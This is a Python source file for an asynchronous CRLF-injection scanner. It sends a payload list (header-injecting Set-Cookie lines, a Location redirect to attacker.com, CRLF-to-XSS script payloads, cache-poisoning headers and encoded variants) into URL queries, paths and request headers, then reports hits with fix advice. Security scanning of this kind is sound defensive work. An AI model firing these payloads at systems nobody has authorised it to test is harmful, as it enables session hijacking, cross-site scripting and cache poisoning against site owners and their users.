import os
import json
import asyncio
import aiohttp
from urllib.parse import urlparse, quote
from logger import get_logger

logger = get_logger(__name__)

class CRLFScanner:
    def __init__(self):
        self.results_dir = "crlf_results"
        os.makedirs(self.results_dir, exist_ok=True)
        self.payloads = [
            # Basic CRLF payloads
            '%0D%0A',
            '%0d%0a',
            '\r\n',
            '\r',
            '\n',
            
            # Header injection payloads
            '%0D%0ASet-Cookie:crlf=injection',
            '%0d%0aSet-Cookie:crlf=injection',
            '%0D%0ALocation:https://attacker.com',
            
            # XSS via CRLF
            '%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>',
            
            # Cache poisoning via CRLF
            '%0d%0aX-Cache-Control:public, max-age=31536000',
            
            # Complex payloads
            '%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection',  # Unicode CRLF
            '%0d%0a%0d%0a<script>alert(document.domain)</script>',  # Double CRLF
            
            # Encoded variations
            '%0%0d%0%0aSet-Cookie:crlf=injection',
            '%u000d%u000aSet-Cookie:crlf=injection'
        ]
        
        self.injection_points = [
            # URL parameters
            {'location': 'query', 'template': '?param={payload}'},
            {'location': 'path', 'template': '/{payload}'},
            
            # Headers
            {'location': 'header', 'name': 'User-Agent', 'template': 'Mozilla/5.0 {payload}'},
            {'location': 'header', 'name': 'Referer', 'template': 'https://example.com{payload}'},
            {'location': 'header', 'name': 'X-Forwarded-For', 'template': '127.0.0.1{payload}'}
        ]

    async def scan_urls(self, urls):
        """
        Scan multiple URLs for CRLF injection vulnerabilities
        """
        try:
            logger.info(f"Starting CRLF scan for {len(urls)} URLs")
            results = {}
            
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    result = await self._scan_url(session, url)
                    if result:
                        results[url] = result
            
            return results
        except Exception as e:
            logger.error(f"Error in CRLF scan: {e}")
            return {}

    async def _scan_url(self, session, url):
        """
        Test a single URL for CRLF injection vulnerabilities
        """
        try:
            vulnerabilities = []
            
            # Test each injection point with each payload
            for injection_point in self.injection_points:
                for payload in self.payloads:
                    result = await self._test_injection(
                        session, url, payload, injection_point
                    )
                    if result:
                        vulnerabilities.append(result)

            if vulnerabilities:
                return {
                    'is_vulnerable': True,
                    'vulnerabilities': vulnerabilities,
                    'recommendations': [
                        "Implement proper input validation",
                        "Filter and encode CRLF sequences",
                        "Use secure header handling",
                        "Implement proper output encoding",
                        "Use secure HTTP libraries",
                        "Consider using security headers (X-Frame-Options, CSP)",
                        "Monitor for suspicious response headers"
                    ],
                    'risk_level': 'High',
                    'cwe': 'CWE-113'
                }

            return None

        except Exception as e:
            logger.error(f"Error scanning URL {url}: {e}")
            return None

    async def _test_injection(self, session, url, payload, injection_point):
        """
        Test a specific CRLF injection payload
        """
        try:
            # Prepare the request based on injection point
            if injection_point['location'] == 'query':
                test_url = self._inject_query_payload(url, payload)
                headers = {}
            elif injection_point['location'] == 'path':
                test_url = self._inject_path_payload(url, payload)
                headers = {}
            else:  # header injection
                test_url = url
                headers = {
                    injection_point['name']: injection_point['template'].format(
                        payload=payload
                    )
                }
            
            # Send the request
            async with session.get(
                test_url,
                headers=headers,
                allow_redirects=False,  # Don't follow redirects to catch injection
                timeout=10
            ) as response:
                # Check for successful CRLF injection
                if await self._check_crlf_success(response, payload):
                    return {
                        'type': 'CRLF Injection',
                        'injection_point': injection_point['location'],
                        'payload': payload,
                        'evidence': await self._extract_evidence(response),
                        'response_code': response.status,
                        'severity': 'High'
                    }
            
            return None

        except Exception as e:
            logger.error(f"Error testing CRLF payload: {e}")
            return None

    def _inject_query_payload(self, url, payload):
        """
        Inject payload into URL query parameters
        """
        parsed = urlparse(url)
        if parsed.query:
            return f"{url}&param={quote(payload)}"
        return f"{url}?param={quote(payload)}"

    def _inject_path_payload(self, url, payload):
        """
        Inject payload into URL path
        """
        return f"{url}/{quote(payload)}"

    async def _check_crlf_success(self, response, payload):
        """
        Check if CRLF injection was successful
        """
        # Check response headers for injection
        headers = dict(response.headers)
        
        # Look for injected headers
        if 'crlf' in headers.get('Set-Cookie', '').lower():
            return True
        
        # Check for XSS via CRLF
        if 'text/html' in headers.get('Content-Type', '') and '<script>' in payload:
            content = await response.text()
            if '<script>' in content:
                return True
        
        # Check for header injection
        for header, value in headers.items():
            if payload.lower() in value.lower():
                return True
        
        return False

    async def _extract_evidence(self, response):
        """
        Extract evidence of successful CRLF injection
        """
        evidence = []
        headers = dict(response.headers)
        
        # Check for injected headers
        for header, value in headers.items():
            if 'crlf' in value.lower() or 'injection' in value.lower():
                evidence.append(f"Injected header found: {header}: {value}")
        
        # Check response body for XSS
        if 'text/html' in headers.get('Content-Type', ''):
            content = await response.text()
            if '<script>' in content:
                evidence.append("XSS payload found in response body")
        
        # Check for cache poisoning
        if 'X-Cache-Control' in headers:
            evidence.append("Cache control header injection detected")
        
        return evidence if evidence else ["Suspicious header modification detected"]

    def _validate_response(self, response_headers):
        """
        Validate if the response headers indicate a successful CRLF injection
        """
        # Add custom validation logic based on response patterns
        pass